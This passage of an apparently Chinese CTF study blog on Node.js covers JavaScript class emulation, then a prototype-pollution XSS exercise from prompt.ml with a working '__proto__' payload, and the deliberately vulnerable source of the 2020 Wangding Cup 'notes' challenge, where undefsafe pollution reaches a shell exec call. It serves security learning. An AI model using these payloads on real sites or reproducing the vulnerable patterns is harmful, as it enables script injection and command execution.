class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/05/10/best-nodejs/16.png" alt="the whole proccess"></p><h3 id="2-1-3-Javascript模拟”类”"><a href="#2-1-3-Javascript模拟”类”" class="headerlink" title="2.1.3  Javascript模拟”类”"></a>2.1.3  Javascript模拟”类”</h3><p>我们知道javascript是能实现面向对象编程的，但javascript语法不支持”类”，导致传统的面向对象编程方法无法直接使用。伟大的程序员做了很多探索，研究了如何用Javascript模拟”类”。 </p><h4 id="2-1-3-1-构造函数法"><a href="#2-1-3-1-构造函数法" class="headerlink" title="2.1.3.1  构造函数法"></a>2.1.3.1  构造函数法</h4><p><img src="/2020/05/10/best-nodejs/17.png" alt="makesound"></p><h4 id="2-1-3-2-极简主义法"><a href="#2-1-3-2-极简主义法" class="headerlink" title="2.1.3.2  极简主义法"></a>2.1.3.2  极简主义法</h4><p><strong>封装</strong>（怎么感觉还要复杂了点！！）</p><p><img src="/2020/05/10/best-nodejs/D:%5Cgithub%5Cblog%5Csource_posts%5Cbest_nodejs%5C18.png" alt="image-20200513212443386"></p><p>这种方法的好处是，容易理解，结构清晰优雅，符合传统的”面向对象编程”的构造，因此可以方便地部署下面的特性。 </p><p><strong>继承</strong></p><p><img src="/2020/05/10/best-nodejs/19.png" alt="继承"></p><p><strong>私有属性和私有方法</strong></p><p><img src="/2020/05/10/best-nodejs/20.png" alt="私有属性和私有方法"></p><p>上例的内部变量age，外部无法获取，可以在内部通过构造函数调用。 </p><p><img src="/2020/05/10/best-nodejs/21.png" alt="调用"></p><h4 id="2-1-3-3-prototype大法"><a href="#2-1-3-3-prototype大法" class="headerlink" title="2.1.3.3  prototype大法"></a>2.1.3.3  prototype大法</h4><h2 id="2-2-题目练习"><a href="#2-2-题目练习" class="headerlink" title="2.2 题目练习"></a>2.2 题目练习</h2><p>掌握上面这些基础就有了，下面就做题吧！！（狗头保命）</p><h3 id="2-2-1-prompt"><a href="#2-2-1-prompt" class="headerlink" title="2.2.1  prompt"></a><em><em>2.2.1 </em></em> prompt</h3><p><strong>考点：</strong>原型链泄露 + replace特性</p><p><strong>参考资料：</strong></p><p><strong>1、</strong><a href="https://xz.aliyun.com/t/4507" target="_blank" rel="noopener">https://xz.aliyun.com/t/4507</a>  </p><p><strong>题目链接：</strong></p><p><strong>1、</strong><a href="http://prompt.ml/13" target="_blank" rel="noopener">http://prompt.ml/13</a></p><p><strong>思路：</strong></p><p><strong>1、</strong>replace函数特性：</p><pre><code>&gt;&#39;11223344&#39;.replace(&#39;2&#39;,&quot;test&quot;)&quot;11test23344&quot;&gt;&#39;11223344&#39;.replace(&#39;2&#39;,&quot;$`test&quot;)&quot;1111test23344&quot;&gt;&#39;11223344&#39;.replace(&#39;2&#39;,&quot;$&#39;test&quot;)&quot;1123344test23344&quot;&gt;&#39;11223344&#39;.replace(&#39;2&#39;,&quot;$&amp;test&quot;)&quot;112test23344&quot;</code></pre><p><strong>2、</strong>调试代码：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 原题基础上魔改了一下，方便调试</span><span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// extend method from Underscore library</span>    <span class="token comment" spellcheck="true">// _.extend(destination, *sources) </span>    <span class="token keyword">function</span> <span class="token function">extend</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> source<span class="token punctuation">,</span> prop<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> length <span class="token operator">=</span> arguments<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//本来就两个元素，length=2，i是从1开始的，就是从JSON.parse(input)开始的</span>            source <span class="token operator">=</span> arguments<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>prop <span class="token keyword">in</span> source<span class="token punctuation">)</span> <span class="token punctuation">{</span>                obj<span class="token punctuation">[</span>prop<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> obj<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// a simple picture plugin</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}</span>        <span class="token keyword">var</span> data <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> config <span class="token operator">=</span> <span class="token function">extend</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// default image source</span>            source<span class="token punctuation">:</span> <span class="token string">'http://placehold.it/350x150'</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// forbit invalid image source</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token regex">/[^\w:\/.]/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>source<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">delete</span> config<span class="token punctuation">.</span>source<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//  设置config.source里的为特殊字符，从而删掉第一部分，这时原型链污染的第二部分就可以填充config.source了</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// purify the source by stripping off "</span>        <span class="token comment" spellcheck="true">//  先把双引号全给过滤了</span>        <span class="token keyword">var</span> source <span class="token operator">=</span> config<span class="token punctuation">.</span>source<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/"/g</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// insert the content using mustache-ish template</span>        <span class="token comment" spellcheck="true">// 上一步把source的双引号全给过滤了，这一步把source放入双引号内(被当成字符串)，可以利用replace的特性实现双引号闭合</span>        <span class="token keyword">return</span> <span class="token string">'&lt;img src="{{source}}">'</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'{{source}}'</span><span class="token punctuation">,</span> source<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">'Invalid image data.'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">const</span> input <span class="token operator">=</span> <span class="token string">'{"source":"*","__proto__":{"source":"$`onerror=prompt(1)>"}}'</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">escape</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-3-真题搜集"><a href="#2-3-真题搜集" class="headerlink" title="2.3  真题搜集"></a>2.3  真题搜集</h2><h3 id="2-3-1-notes（2020网鼎杯青龙组）"><a href="#2-3-1-notes（2020网鼎杯青龙组）" class="headerlink" title="2.3.1  notes（2020网鼎杯青龙组）"></a>2.3.1  notes<code>（2020网鼎杯青龙组）</code></h3><p><strong>参考资料：</strong></p><p><strong>1、</strong>express app.set()  <a href="https://blog.csdn.net/qq_31411389/article/details/53673792" target="_blank" rel="noopener">https://blog.csdn.net/qq_31411389/article/details/53673792</a></p><p><strong>2、</strong>Express中app.use()用法  <a href="https://www.jianshu.com/p/1d92463ebb69" target="_blank" rel="noopener">https://www.jianshu.com/p/1d92463ebb69</a></p><p><strong>3、</strong>res.render  <a href="https://www.zhihu.com/question/36979935?sort=created" target="_blank" rel="noopener">https://www.zhihu.com/question/36979935?sort=created</a></p><p><strong>4、</strong>node child_process模块  <a href="https://www.cnblogs.com/cangqinglang/p/9886657.html" target="_blank" rel="noopener">https://www.cnblogs.com/cangqinglang/p/9886657.html</a></p><p><strong>5、</strong>undefsafe  <a href="https://www.npmjs.com/package/undefsafe" target="_blank" rel="noopener">https://www.npmjs.com/package/undefsafe</a></p><p><strong>6、</strong>[网鼎杯 2020 Web Writeup]  <a href="https://www.xmsec.cc/wang-ding-bei-2020-web-writeup/" target="_blank" rel="noopener">https://www.xmsec.cc/wang-ding-bei-2020-web-writeup/</a></p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> undefsafe <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'undefsafe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">{</span> exec <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Notes</span> <span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>owner <span class="token operator">=</span> <span class="token string">"whoknows"</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>note_list <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">write_note</span><span class="token punctuation">(</span>author<span class="token punctuation">,</span> raw_note<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>note_list<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>num<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"author"</span><span class="token punctuation">:</span> author<span class="token punctuation">,</span><span class="token string">"raw_note"</span><span class="token punctuation">:</span>raw_note<span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">get_note</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> r <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        <span class="token function">undefsafe</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> id<span class="token punctuation">,</span> <span class="token function">undefsafe</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>note_list<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> r<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">edit_note</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> author<span class="token punctuation">,</span> raw<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">undefsafe</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>note_list<span class="token punctuation">,</span> id <span class="token operator">+</span> <span class="token string">'.author'</span><span class="token punctuation">,</span> author<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">undefsafe</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>note_list<span class="token punctuation">,</span> id <span class="token operator">+</span> <span class="token string">'.raw_note'</span><span class="token punctuation">,</span> raw<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">get_all_notes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>note_list<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">remove_note</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">delete</span> <span class="token keyword">this</span><span class="token punctuation">.</span>note_list<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> notes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Notes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>notes<span class="token punctuation">.</span><span class="token function">write_note</span><span class="token punctuation">(</span><span class="token string">"nobody"</span><span class="token punctuation">,</span> <span class="token string">"this is nobody's first note"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'views'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'pug'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">{</span> extended<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token keyword">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> title<span class="token punctuation">:</span> <span class="token string">'Notebook'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'/add_note'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>message<span class="token punctuation">:</span> <span class="token string">'please use POST to add a note'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> author <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>author<span class="token punctuation">;</span>        <span class="token keyword">let</span> raw <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>raw<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>author <span class="token operator">&amp;&amp;</span> raw<span class="token punctuation">)</span> <span class="token punctuation">{</span>            notes<span class="token punctuation">.</span><span class="token function">write_note</span><span class="token punctuation">(</span>author<span class="token punctuation">,</span> raw<span class="token punctuation">)</span><span class="token punctuation">;</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>message<span class="token punctuation">:</span> <span class="token string">"add note sucess"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>message<span class="token punctuation">:</span> <span class="token string">"did not add note"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'/edit_note'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>message<span class="token punctuation">:</span> <span class="token string">"please use POST to edit a note"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> id <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>id<span class="token punctuation">;</span>        <span class="token keyword">let</span> author <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>author<span class="token punctuation">;</span>        <span class="token keyword">let</span> enote <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>raw<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">&amp;&amp;</span> author <span class="token operator">&amp;&amp;</span> enote<span class="token punctuation">)</span> <span class="token punctuation">{</span>            notes<span class="token punctuation">.</span><span class="token function">edit_note</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> author<span class="token punctuation">,</span> enote<span class="token punctuation">)</span><span class="token punctuation">;</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>message<span class="token punctuation">:</span> <span class="token string">"edit note sucess"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>message<span class="token punctuation">:</span> <span class="token string">"edit note failed"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'/delete_note'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>message<span class="token punctuation">:</span> <span class="token string">"please use POST to delete a note"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> id <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>id<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token punctuation">{</span>            notes<span class="token punctuation">.</span><span class="token function">remove_note</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>message<span class="token punctuation">:</span> <span class="token string">"delete done"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>message<span class="token punctuation">:</span> <span class="token string">"delete failed"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'/notes'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> q <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q<span class="token punctuation">;</span>        <span class="token keyword">let</span> a_note<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            a_note <span class="token operator">=</span> notes<span class="token punctuation">.</span><span class="token function">get_all_notes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            a_note <span class="token operator">=</span> notes<span class="token punctuation">.</span><span class="token function">get_note</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'note'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>list<span class="token punctuation">:</span> a_note<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'/status'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> commands <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"script-1"</span><span class="token punctuation">:</span> <span class="token string">"uptime"</span><span class="token punctuation">,</span>            <span class="token string">"script-2"</span><span class="token punctuation">:</span> <span class="token string">"free -m"</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> index <span class="token keyword">in</span> commands<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>shell<span class="token punctuation">:</span><span class="token string">'/bin/bash'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">return</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`stdout: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>stdout<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'OK'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Sorry cant find that!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Something broke!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> port <span class="token operator">=</span> <span class="token number">8080</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token 